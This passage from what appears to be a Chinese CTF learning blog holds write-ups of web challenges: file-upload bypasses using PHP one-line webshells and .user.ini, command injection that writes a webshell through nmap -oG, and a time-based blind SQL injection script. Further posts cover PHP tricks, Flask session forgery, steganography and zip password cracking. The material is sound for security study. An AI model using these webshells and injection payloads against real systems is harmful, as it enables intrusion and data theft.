        <content type="html"><![CDATA[<p>#前言</p><p>今天有个比赛，baby杯群主说他出了一道签到题，然而我还是做不出来，向群主问问题的时候，群主灵魂一问，你文件上传的题目刷完没有，你刷完就会了，好的，菜狗重新滚回来刷题了</p><span id="more"></span><h2>web 151</h2><p>提示说前台校检不可靠，其实意思就是如果我们上传的文件，会经过前端和后端的校监，诶呀，怎么感觉能想出来是什么意思，但是就是说不出来</p><p>写了一句话木马：<?php eval($_POST[1]);?>,该后缀为jpg提示说，后缀不对。。。看源码</p><p><img src="1.PNG"></p><p>只能接受png结尾的</p><p>上传图片，将后缀改为.php结尾的，否者我们的木马没有办法杯解析</p><p>然后访问upload/1.php，执行命令，得到flag</p><p>$flag=”ctfshow{e669d9fe-f9a0-4b0f-8143-578602bebcfa}”;</p><h2>web 152</h2><p>提示说后端校监要严密，有可能对php有了什么新的过滤？先上传看看</p><p>emmmmm跟上一道题目一样</p><h2>web 153</h2><p>依旧是提示后端校验要严密，emmm这次一定该有过滤了，先上传试试。果然出错了，把后缀改为php3，php5都可以。。。。啊啊啊竟然不可以，为什么。。。。。我已经菜到做到第3题就不可以了嘛。。。。。再试试phtml</p><p>做出来了嘿嘿，.user.ini嘿嘿</p><p>先上传.user.ini,然后再将我们的一句话木马的图片传上去，就可以了嘿嘿嘿</p><h2>web 154</h2><p>提示到后台不能单二校验，先上传！！！</p><p>我试试上传了png：文件上传失败，失败原因：文件内容不合规，所以就是感觉文件内容被过滤了，所以单二校验就是说的是对文件内容遭到了过滤</p><p>我刚才用<?=eval($_POST[1]);?>,成功的绕过了单二校验，但是上传后还是nothing here!</p><p>成功了！！！哈哈哈哈哈哈哈，还是跟上到题目题目一样，但是最后再后面上传图片里面的png里一句话木马，只不过是采用了‘=’短标签</p><h2>web 155</h2><p>变成了后端的单三校验，感觉emmmmm，加油你可以了</p><p>我试了一下上传.user.ini，可以上传</p><p>就很奇怪，因为我最开始上传的还是.user.ini嘛，不是上传成功了，然后我就先看看upload/发现就一直显示页面错误，然后我这道题以前不是做出来了·嘛，就感觉肯定还是可以做的，然后我就抱着试试的心态，上传了.png文件，是png文件，我后缀都没有改，它竟然·成功了！！！！？？？？有些许迷茫</p><p>ok疑问解决了，我又重新开了一次环境，果然还是需要先上传.user.ini得</p><h2>web 156</h2><p>好家伙，变成了不能单四校验</p><p>好家伙我i还以为是吧&lt;?给过滤了，我还想着咋搞，玩意这是把[]过滤了，果然ctf得水太深了,我还是慢慢把握吧。。。</p><h2>web 157</h2><p>好家伙好家伙，不能单五校验。。。。</p><p>我先试试我看了下是[],{},;被过滤了，我本来想使用url编码但是欸有成功，不知道为啥，明明可以显示这个界面，但是执行命令没有回显</p><p>aaaaa这里用到了反引号。。。还是对这个知识点不熟悉</p><p>不需要用到[],也不会要用到</p><pre><code>&lt;?=`ls`?&gt;</code></pre><h2>web 158</h2><p>emmmm单六校验</p><p>其实就是说我试了一下应该是flag.php也被过滤了，就直接</p><pre><code>&lt;?=`cat ../f*`?&gt;就可以了</code></pre><h2>web 159</h2><p>同上</p><p>完蛋，反引号被禁用了，突然感觉到这究竟是关于文件上传的绕过，还是命令执行啊！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php-key溢出</title>
      <link href="/2021/05/31/php-key%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/05/31/php-key%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>菜狗只会这一道，还是在大佬的提示下做出来的，但是狗的是着题最后还整了图片分离？？？</p><span id="more"></span><p>源码</p><pre><code>&lt;?php        $six_number = $_POST[&#39;webp&#39;];        $a = $_POST[&#39;a&#39;];        $b = $_POST[&#39;b&#39;];        $c = $_POST[&#39;c&#39;];        if (md5($six_number) == &#39;e10adc3949ba59abbe56e057f20f883e&#39; &amp;&amp; md5($a) === md5($b) &amp;&amp; $a !== $b) &#123;            if($array[++$c]=1)&#123;                if($array[]=1)&#123;                    echo &quot;nonono&quot;;                &#125;                else&#123;                    require_once &#39;flag.php&#39;;                    echo $flag;                &#125;            &#125;        &#125; </code></pre><p>前面的挺好绕过的，就那个MD5加密的话在网站上解密就可以解出来，或者自己写个脚本就可以</p><pre><code>import hashlibfor i in range(100000,999999):s1 = str(i)m = hashlib.md5()#创建一个md5的对象m.update(s1.encode(&quot;utf-8&quot;))#进行md5编码if(m.hexdigest()==&quot;e10adc3949ba59abbe56e057f20f883e&quot;):   print(i)</code></pre><p>后面哪个就是强类型比较，见的也比较多了数组绕过a[]=1&amp;&amp;b[]=2</p><p>原理就是：md5强比较，此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等</p><p>成功绕过之后我们进入第二阶段</p><p>那就先将知识点吧</p><p>先给出一个key溢出的例子：</p><p><img src="1.PNG"></p><p>我们可以看到当key值比较小是没有问题的，当key值很大的时输出的值溢出了，临界点是9223372036854775807，但是我在想的是为什么只有在临界点的时候才可以绕过</p><p><img src="2.PNG"></p><p>我们看到虽然报错了，但是就饶过了赋值这个限制</p><p><img src="3.PNG"></p><p>看下报错显示的信息：</p><p>PHP Warning:  Cannot add element to the array as the next element is already occupied in /home/lucky/桌面/1.php on line 9</p><p>提示说无法将元素添加到数组中，因为下一个元素已被占用</p><p>想一下，$array[]=1其实就是相当于给$array[0]赋值，如果成功赋值则但是就为true，就进入到了if里面，但是如果没有成功赋值就为false，进入到else里面</p><p>emmm不想找了，感觉溢出就是把$array[]的值给占了，如果将$array[1]就不会溢出</p><p>后面就直接misc隐写</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>online-tool</title>
      <link href="/2021/05/30/online-tool/"/>
      <url>/2021/05/30/online-tool/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>简单的看了一下这个是nmap这个工具，害，这几天对老是使用nmap，这回还能碰上也是没谁了。</p><p>分析代码</p><pre><code>if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;$_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];&#125;</code></pre><p>获取ip，并将其赋值给$_SERVER[‘REMOTE_ADDR’]，浏览当前网页所使用的IP</p><pre><code>if(!isset($_GET[&#39;host&#39;])) &#123;highlight_file(__FILE__);&#125; else &#123;$host = $_GET[&#39;host&#39;];$host = escapeshellarg($host);$host = escapeshellcmd($host);$sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);echo &#39;you are in sandbox &#39;.$sandbox;@mkdir($sandbox);chdir($sandbox);echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125;</code></pre><p>escapeshellarg：确保用户只能传递一个参数给命令，用户不能指定更多的参数，用户不能执行不同的命令</p><p>escapeshellcmd：确保用户只执行一个命令，用户可以指定不限数量的参数，用户不能执行不同的命令</p><p><img src="1.png"></p><p><img src="2.png"></p><p>mkdir创建一个一幕</p><p>nmap -T5 -sT -Pn –host-timeout 2 -F</p><p>-T5时间优化5秒，TCP扫描连接 -Pn在线处理所有的主机，跳过主机发现，限制扫描时间是两秒，快速扫描</p><p>我在想这道题目是不是需要我们第一必须要协商ip，然后在ip后面接着执行命令执行</p><p>刚才一直在想怎么构造payload，使其可以在转义的调价下，依然做到127.0.0.12 &amp; ls;但是好像不行</p><p><img src="3.PNG"></p><p>然后看了一眼WP，我忽略了一点，为什么会有mkdir和chdir，如果我只是想简单的去在system去执行payload，根本没有必要使用这两个函数，所以这啷个函数在这里必然会有很重要的作用</p><p>刚才拼接命令一直没有成功，提示说nmap命令中参数-oG可以实现将命令和结果写道文件（也就是写进去木马）</p><p>然后我又陷进去了，我大概想到了思路就是说，将木马写进文件1.php里，然后访问/0a4719a024d42d6bbf3aaf5ac68855d5/1.php，然后通过木马进行连接。。。。</p><p>可是，我错了。。。。。</p><p>是操作错了，我一直以为要加一个ip，才可以写入</p><p>其实不加就可以，我们要写的就是<?php eval($_POST['A']);?> -oG 1.php</p><p>本来想着怎么操作，在想怎么加，但是想起来刚才想构造的payload，就是还怎么构造都无法逃逸，看wp</p><p>发现只要在外面加两个单引号，里面的都可以不用管了，然后就成功的得到了flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>我有一个数据库</title>
      <link href="/2021/05/30/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2021/05/30/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>我有一个数据库</p><p>phpmyadmin，数据库复现</p><pre><code>if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) &#123;    include $_REQUEST[&#39;target&#39;];    exit;&#125;</code></pre><p>漏洞点在这里</p><p>1.target不是空<br>2.target需要是字符串<br>3.target不能以index开头<br>4.target不能在$target_blacklist = array (<br>    ‘import.php’, ‘export.php’<br>);里面</p><p>5.查看一下Core::checkPageValidity</p><pre><code>        public static function checkPageValidity(&amp;$page, array $whitelist = [])&#123;    if (empty($whitelist)) &#123;        $whitelist = self::$goto_whitelist;    &#125;    if (! isset($page) || !is_string($page)) &#123;        return false;    &#125;    if (in_array($page, $whitelist)) &#123;        return true;    &#125;    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) &#123;        return true;    &#125;    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) &#123;        return true;    &#125;    return false;&#125;</code></pre><p>这里我可太熟悉了呀，这不是warmup嘛哈哈哈哈哈哈，就不分析了哈哈哈哈。</p><p>主要是这道题目，也不算是难题，还是关键看扫目录，目录扫不出来一切都百搭，还有像这种题目，可以在百度上搜索一下相关漏洞便于做题。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>swpu-web6</title>
      <link href="/2021/05/28/swpu-web6/"/>
      <url>/2021/05/28/swpu-web6/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p><img src="1.PNG"></p><p>打开题目就是这样子的，认真观察下，有三点：一个是登录，猜测跟sql有关，然后第二点显示：method can useindex，有点无厘头，不知道这是干嘛的。第三点：Click “Join us” to see the form switch Demo 1<br>点击demo1，url后面加上了index。html，没什么实际用处。那么进行注入</p><p>先fuzz了一下</p><p><img src="2.PNG"></p><p>199的都是被过滤的，select被过滤相当于很大一部分注入姿势都用不了，join无列名注入不可，括号被过滤更绝，sleep盲注用不了。</p><p>然后在输入用户名跟密码的时候发现了问题。</p><p><img src="3.PNG"></p><p><img src="5.PNG"></p><p>发现了有两种情况，要不是密码错误，要不是就是用户名和密码错误，用户名这里我用到了万能密码，所以它后台检测的应该就是密码了，需要我们输入一个密码可以跟它后台的密码对上，看到有大佬猜测源码</p><pre><code>$sql=&quot;select * from users where username=&#39;$name&#39; and passwd=&#39;$pass&#39;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123;     $key = mysql_fetch_array($query);if($key[&#39;passwd&#39;] == $_POST[&#39;passwd&#39;]) &#123;</code></pre><p>但是很显然，根本就不知道密码是啥，只能想办法在不知道密码的情况下，绕过后台的检测。</p><p>学到了一个新的知识 with rollup</p><p><img src="6.PNG"></p><p>可以看到，最后一行，用户名是null，那么根据这个道理，我们同样也可以将passwd置为空，这样我们就可以成功绕过。</p><p>但是还有一个问题，我们用上述语句可以得到不止一行的passwd，只有最后一行的passwd是null。因为不能用limit，所以我们需要通过另一个语句绕过</p><p><img src="7.PNG"></p><p>同样运用在登录界面上</p><p><img src="9.PNG"></p><p><img src="8.PNG"></p><p>我刚才还在想，输入语句哈哈哈哈，真是傻了。</p><p>现在成功登录，然儿噩梦才刚刚开始，头秃。。。。。</p><p>wsdl.php</p><p>buu上面应该是少给了这个</p><p>f12</p><pre><code>&lt;/operation&gt;&lt;operation name=&quot;login&quot;&gt;&lt;input message=&quot;tns:loginRequest&quot; /&gt;&lt;output message=&quot;tns:loginResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;set_cookie&quot;&gt;&lt;input message=&quot;tns:set_cookieRequest&quot; /&gt;&lt;output message=&quot;tns:set_cookieResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;user&quot;&gt;&lt;input message=&quot;tns:userRequest&quot; /&gt;&lt;output message=&quot;tns:userResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;check&quot;&gt;&lt;input message=&quot;tns:checkRequest&quot; /&gt;&lt;output message=&quot;tns:checkResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;File_read&quot;&gt;&lt;input message=&quot;tns:File_readRequest&quot; /&gt;&lt;output message=&quot;tns:File_readResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;hint&quot;&gt;&lt;input message=&quot;tns:hintRequest&quot; /&gt;&lt;output message=&quot;tns:hintResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;Get_flag&quot;&gt;&lt;input message=&quot;tns:Get_flagRequest&quot; /&gt;&lt;output message=&quot;tns:Get_flagResponse&quot; /&gt;&lt;/operation&gt;</code></pre><p>看到了login跟user，反应过来应该是那个？method=xxx</p><p>所以一个一个试试<br>set_cookie  check</p><p>File_read：</p><p><img src="10.PNG"></p><p>提示input，感觉应该是post提交，这个有帮助，不如返回wsdl.php，仔细观察一下File_read.</p><p><img src="11.PNG"></p><p>果然有发现，这个filename应该就是post提交的参数，但是那个txt文件是干什么的暂时不知道，我尝试读取了一下</p><p><img src="12.PNG"></p><p>emmmmm，一点都不好玩，害。。。。。。。</p><p>那就先放在这里把，继续看其他的</p><p>hint:</p><p><img src="13.PNG"></p><p>在尝试在那个里面读取这几个文件index.php Service.php interface.php se.php</p><p>index.php:</p><pre><code>&lt;?phpob_start();include (&quot;encode.php&quot;);include(&quot;Service.php&quot;);//error_reporting(0);//phpinfo();$method = $_GET[&#39;method&#39;]?$_GET[&#39;method&#39;]:&#39;index&#39;;//echo 1231;$allow_method = array(&quot;File_read&quot;,&quot;login&quot;,&quot;index&quot;,&quot;hint&quot;,&quot;user&quot;,&quot;get_flag&quot;);if(!in_array($method,$allow_method))&#123;    die(&quot;not allow method&quot;);&#125;if($method===&quot;File_read&quot;)&#123;    $param =$_POST[&#39;filename&#39;];    $param2=null;&#125;else&#123;    if($method===&quot;login&quot;)    &#123;        $param=$_POST[&#39;username&#39;];        $param2 = $_POST[&#39;passwd&#39;];    &#125;else    &#123;            echo &quot;method can use&quot;;    &#125;&#125;echo $method;$newclass = new Service();echo $newclass-&gt;$method($param,$param2);ob_flush();?&gt;</code></pre><p>先用代码审计扫了一下没有什么漏洞，那就分析一下吧 </p><p><img src="14.PNG"></p><p>service.php:not allow read,应该是我们没有权限读取（因为我刚才尝试读flag，它是什么回显都没有的，所以猜测是一定存在这个文件的只是我们没有权限读取，啊不，index.php中都包含service了，说明一定存在）</p><p>interface.php：</p><pre><code> &lt;?php   include(&#39;Service.php&#39;);$ser = new SoapServer(&#39;Service.wsdl&#39;,array(&#39;soap_version&#39;=&gt;SOAP_1_2));$ser-&gt;setClass(&#39;Service&#39;);$ser-&gt;handle();?&gt; </code></pre><p>确认过是我看不懂的代码。。。</p><p><img src="15.PNG"></p><p>解决了刚才那个问题</p><p>继续看下去se.php：</p><pre><code>&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);//看到这个我突然感觉我反序列化的时候遇到过，找找相关例题看看class aa&#123;        public $mod1;        public $mod2;        public function __call($name,$param)        &#123;            if($this-&gt;&#123;$name&#125;)                &#123;                    $s1 = $this-&gt;&#123;$name&#125;;                    $s1();                &#125;        &#125;        public function __get($ke)        &#123;            return $this-&gt;mod2[$ke];        &#125;&#125;class bb&#123;        public $mod1;        public $mod2;        public function __destruct()        &#123;            $this-&gt;mod1-&gt;test2();        &#125;&#125; class cc&#123;        public $mod1;        public $mod2;        public $mod3;        public function __invoke()        &#123;                $this-&gt;mod2 = $this-&gt;mod3.$this-&gt;mod1;        &#125; &#125;class dd&#123;        public $name;        public $flag;        public $b;        public function getflag()        &#123;                session_start();                 var_dump($_SESSION);                $a = array(reset($_SESSION),$this-    &gt;flag);                echo call_user_func($this-&gt;b,$a);        &#125;&#125;class ee&#123;        public $str1;        public $str2;        public function __toString()        &#123;                $this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;();                return &quot;1&quot;;        &#125;&#125;$a = $_POST[&#39;aa&#39;];unserialize($a);?&gt;</code></pre><p>这必然是要构造一个反序列化链，但是，我构造链要做什么？读取service。php吗，还是什么呢？继续看看吧。</p><p>Get_flag：不成功，然后濡染想起来index.php，尝试get_flag</p><p><img src="12.PNG"></p><p>感觉是ssrf越权，这点不会，看看资料吧</p><p>然后想起来有一个encode.php尝试读取</p><pre><code>&lt;?phpfunction en_crypt($content,$key)&#123;$key    =    md5($key);$h      =    0;$length    =    strlen($content);$swpuctf      =    strlen($key);$varch   =    &#39;&#39;;for ($j = 0; $j &lt; $length; $j++)&#123;    if ($h == $swpuctf)    &#123;        $h = 0;    &#125;    $varch .= $key&#123;$h&#125;;    $h++;&#125;$swpu  =  &#39;&#39;;for ($j = 0; $j &lt; $length; $j++)&#123;    $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256);&#125;return base64_encode($swpu);&#125;    </code></pre><p>这生成了一个加密的swpu，看cookie里面的user，它里面有一个值是3J6Roahxag==，着看着很像是base64，但是base64解码解出来是乱码，结合这个encode的加密，可以反推出来用户名，我的妈呀，这是人想的做法吗。。。。</p><pre><code>&lt;?phpfunction de_crypt($swpu,$key)&#123;$swpu=base64_decode($swpu);$key    =    md5($key);$h      =    0;$length    =    strlen($swpu);$swpuctf      =    strlen($key);$varch   =    &#39;&#39;;for ($j = 0; $j &lt; $length; $j++)&#123;    if ($h == $swpuctf)    &#123;        $h = 0;    &#125;    $varch .= $key&#123;$h&#125;;    $h++;&#125;$swpu  =  &#39;&#39;;for ($j = 0; $j &lt; $length; $j++)&#123;    $content .=chr(ord($swpu&#123;$j&#125;)-(ord($varch&#123;$j&#125;)));&#125;return $content;&#125;    print(de_crypt(&#39;3J6Roahxag==&#39;,&#39;flag&#123;this_is_false_flag&#125;&#39;));</code></pre><p>然后这个key嘛就结合我们刚才读出来的那个假的flag，进行读去，得到cookie：xiaoC:2</p><p>操？？？把cookie修改了说什么你还没有登录，登录之后cookie又遍历。。。无语了只能进行ssrf了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LSB</title>
      <link href="/2021/05/24/LSB/"/>
      <url>/2021/05/24/LSB/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>图片隐写的关键就是说利用修改数据的方式来传递信息，其中的一种方式就是LSB（最低有效位来进行隐写）原理就是：图片是由三原色组成的，每个像素都有8bit,lsb就是通过修改了最低的1bit，在人眼看不出来区别的情况下，将信息隐藏了起来</p><p>题目</p><p>将图片放入stegsovle中进行数据分析</p><p><img src="1.PNG">  得到了一张二维码扫码得到flag</p><p>为什么把三原色都调成了0，因为最低位啊</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>swup-web4</title>
      <link href="/2021/05/24/swup-web4/"/>
      <url>/2021/05/24/swup-web4/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>我到底什么时候才能记得保存啊啊啊啊啊啊，又全没了，服了我自己。</p><p>先说这道题目，拿到题目要进行登录，但是无论输入什么，点击登录都没有任何反应，注册功能还没有开启，目录啥也扫不出来，就纳闷</p><p>然后抓包有发现，就是来到了一个新的界面</p><p><img src="1.PNG"></p><p>然后我尝试了2” #发现登录成功，但是就仅仅是登录成功，其他的没有任何进展，就很纳闷，就是没有什么进展</p><p>然后查看wp说</p><p>这是堆叠注入，它有堆叠注入的明显的特征，就是如果输入1’,报错，但是输入1’;没有报错</p><p><img src="2.PNG"></p><p><img src="3.PNG"></p><p>然后我进行其他的操作就是1’;show databases;#,依旧是什么都没有，只好再次求助WP</p><p>这是在pdo条件下的堆叠注入加预注入，其实堆叠注入和预注入当时在做强网杯的时候就碰见过当时没有好好的整理</p><p>还是先了解一下什么时pdo把，就是php data object，默认情况下的pdo是可以执行有；参与的多语句执行的，那我们就能闭合前面的单引号后进行堆叠注入</p><p>其实就是在pdo情况下才可以这样子做，其他情况下就不一定了，就是相当于提供了一个条件</p><p>并且这道题目很怪的地方就是，我进行堆叠注入的时候是没有会显得，我做的时候不知道时什么情况，应该就是过滤了，过滤了很多关键字。因为什么关键字被过滤了，所以我们采用16进制加时间盲注绕过</p><p>先说盲注，我都忘记的差不多了。</p><p>为什么要进行盲注，因为没有回显，我刚才进行测试的时候就没有特别的回显，所以要采用没有特别回显的时间盲注</p><p><img src="4.PNG"></p><p>观察下面的时间，第一个是错误的所以反应时间是0秒，但是第二个是正确的所以反应时间是5秒。</p><p>那么我们就可以通过ascii，substr来获取数据库的名称之类的</p><p><img src="5.PNG"></p><p><img src="6.PNG"></p><p>ok，其实想要知道是不是又那个时间忙著，我们可以通过select if(1=1,sleep(2),0);就通过时间来进行判断</p><p>然后在复习一下预处理</p><p>set @a=sql语句；prepare test from @a;execute test;</p><p><img src="7.PNG"></p><p>然后写脚本</p><pre><code>#author: c1e4rimport requestsimport jsonimport timedef main():#题目地址url = &#39;&#39;&#39;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#39;&#39;&#39;#注入payloadpayloads = &quot;asd&#39;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;flag = &#39;&#39;for i in range(1,30):    #查询payload    payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;    for j in range(0,128):        #将构造好的payload进行16进制转码和json转码        datas = &#123;&#39;username&#39;:payloads.format(str_to_hex(payload.format(i,j))),&#39;password&#39;:&#39;test213&#39;&#125;        data = json.dumps(datas)        times = time.time()        res = requests.post(url = url, data = data)        if time.time() - times &gt;= 3:            flag = flag + chr(j)            print(flag)            breakdef str_to_hex(s):return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])if __name__ == &#39;__main__&#39;:main()</code></pre><p>都跑不出来</p><p>结果就是glzjin_wants_a_girl_friend.zip，得到源码，里面有一个flag。php，但是没用，我们仅仅是知道flag存在与flag.php，有看到说配置一般在Controller这个文件里面，于是机型代码审计</p><p><img src="10.PNG"></p><p><img src="8.PNG"></p><p>这里有一个include，应该是存在文件包含漏洞然后也存在extract存在覆盖</p><p>我们可以看看那里有涉及到了这个函数</p><p><img src="9.PNG"></p><p>发现有那个request的提交方式，于是</p><p><img src="11.PNG"></p><p>构造</p><p><img src="12.PNG"></p><p>得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>misc-金三胖，二维码</title>
      <link href="/2021/05/21/misc-%E9%87%91%E4%B8%89%E8%83%96%EF%BC%8C%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
      <url>/2021/05/21/misc-%E9%87%91%E4%B8%89%E8%83%96%EF%BC%8C%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><h2>金三胖</h2><p>这道题目的附件下载下来就是gif，然后随着gif动画的跳动，可以看都有flag的字样，然后用ps打开就可以看到给gif每一帧的动画，得到flag</p><h2>二维码</h2><p>下载附件是一个二维码，扫一下没有什么收获，用foremost分离得到一个zip文件，有密码</p><p>我一开始想的是伪加密，然后错了嘛，但是还是要记录一下伪加密学到的知识</p><p>一个zip文件由压缩源文件数据区，压缩源文件目录区，压缩源文件目录结束标志</p><p>院所源文件数据库</p><p>50 4B 03 04:这是头文件的标志</p><p>14 00:解压文件的pkware版本</p><p>00 00：全局方式位标记(有无加密)</p><p>08 00：压缩方式</p><p>压缩源文件目录区：</p><p>50 4B 01 02:目录中文件头标志</p><p>3F 00:解压使用的pkware版本</p><p>14 00：解压文件所需的pkware版本</p><p>00 00：全局文件位标记（有无加密，这里就是是否进行伪加密的关键点）</p><p>08 00：压缩方式</p><p>如果压缩源文件数据区的全局方式为00 00 但是压缩源文件目录区是09 00就说明是伪加密，但是这个里面两个地方都是09 09，所说明是真加密，然后使用kali上的工具爆破密码fcrakzip -b -c ‘aA1:’ -l 4 -u 00000000.zip来爆破</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn-upload</title>
      <link href="/2021/05/20/ciscn-upload/"/>
      <url>/2021/05/20/ciscn-upload/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>打开题目即是源码，还扫除来一个example.php</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019-Web3</title>
      <link href="/2021/05/19/SWPU2019-Web3/"/>
      <url>/2021/05/19/SWPU2019-Web3/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>做的时候才出来是flask伪造了，但是就是不知道key该怎么找</p><span id="more"></span><p><img src="1.PNG"></p><p>打开登录页面，然后就先随便注册一个上去，之后会看见显示说</p><p><img src="2.PNG"></p><p>我当时以为是ssti模板注入，因为它标题也是flask嘛，我就先试试4，但是它没有反应，显示的依然是your name is 4，然后我又想说是不是是在url后面直接加上？name=xxx，但是依然不对。后来我点击一下upload那个按钮，发现有提示说是权限不够，然后果断抓包看session，果然有问题，它这里的session长得特别向寒假开学实验室比赛里的session，往是不是session伪造那方面考虑了。</p><p>然后先用脚本将session解密</p><pre><code>#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#39;.&#39;, 1)    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)    decompress = False    if payload.startswith(b&#39;.&#39;):        payload = payload[1:]        decompress = Truetry:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#39;Could not base64 decode the payload because of &#39;                     &#39;an exception&#39;)if decompress:    try:        payload = zlib.decompress(payload)    except Exception as e:        raise Exception(&#39;Could not zlib decompress the payload before &#39;                         &#39;decoding the payload&#39;)return session_json_serializer.loads(payload)if __name__ == &#39;__main__&#39;:    print(decryption(sys.argv[1].encode()))</code></pre><p>解密出来是</p><pre><code>&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre><p>然后我们就要想怎么去进行提权了，看WP说这个b’100’,改为b’1’可以提权，然后就要怎么去找密钥进行session伪造，我卡在了这，我一直在想在哪去·找密钥，整个界面看起来能存在漏洞的地方就是那个your name is admin，我也在网上看一些例题说是可以在config中找到，所以我再一次想到了，然而还是没用。</p><p>特别秀，看完wp，说当访问一个不存在的网页的时候，会在请求头那里出现密钥，然后我尝试访问admin</p><p><img src="3.PNG"></p><p>base64解码得到密钥，然后进行cookie伪造，成功进入上传页面。</p><pre><code>@app.route(&#39;/upload&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])def upload():if session[&#39;id&#39;] != b&#39;1&#39;:    return render_template_string(temp)if request.method==&#39;POST&#39;: # 获取post传参，    m = hashlib.md5()    name = session[&#39;password&#39;]    name = name+&#39;qweqweqwe&#39;    name = name.encode(encoding=&#39;utf-8&#39;)    m.update(name) # password+ **  之后的md5值，    md5_one= m.hexdigest() # 这个是 是不是md5拓展攻击啊，没有回显，得不到一组已知的盐和明文估计不是    n = hashlib.md5()    ip = request.remote_addr # 这个remote_addr我还不是很熟悉啊，，好像PHP中的我也不熟悉。。。（汗）    ip = ip.encode(encoding=&#39;utf-8&#39;)    n.update(ip)    md5_ip = n.hexdigest() # 还有ip的md5    f=request.files[&#39;file&#39;]    basepath=os.path.dirname(os.path.realpath(__file__)) # 就是获得当前文件的目录嘛，就是这个py文件所在的目录，    path = basepath+&#39;/upload/&#39;+md5_ip+&#39;/&#39;+md5_one+&#39;/&#39;+session[&#39;username&#39;]+&quot;/&quot;    path_base = basepath+&#39;/upload/&#39;+md5_ip+&#39;/&#39;    filename = f.filename    pathname = path+filename    if &quot;zip&quot; != filename.split(&#39;.&#39;)[-1]: # 检查后缀，        return &#39;zip only allowed&#39;    if not os.path.exists(path_base): # 不存在目录的话，创建一个        try:            os.makedirs(path_base)        except Exception as e:            return &#39;error&#39;    if not os.path.exists(path): # 进一步，如果不存在目录的化，创建一个        try:            os.makedirs(path)        except Exception as e:            return &#39;error&#39;    if not os.path.exists(pathname): # 该目录下，是否存在这个文件，有，就保存，        try:            f.save(pathname)        except Exception as e:            return &#39;error&#39;    try:        cmd = &quot;unzip -n -d &quot;+path+&quot; &quot;+ pathname # 就是不覆盖文件解压该zip文件到该目录下，        if cmd.find(&#39;|&#39;) != -1 or cmd.find(&#39;;&#39;) != -1: # 如果找到了 | 或者 ； 就 不行，            waf()            return &#39;error&#39;        os.system(cmd)    except Exception as e:        return &#39;error&#39;    unzip_file = zipfile.ZipFile(pathname,&#39;r&#39;)    unzip_filename = unzip_file.namelist()[0] # unzip_filename 这个是一个列表楼    # f = zipfile.ZipFile(filename, &#39;r&#39;) # 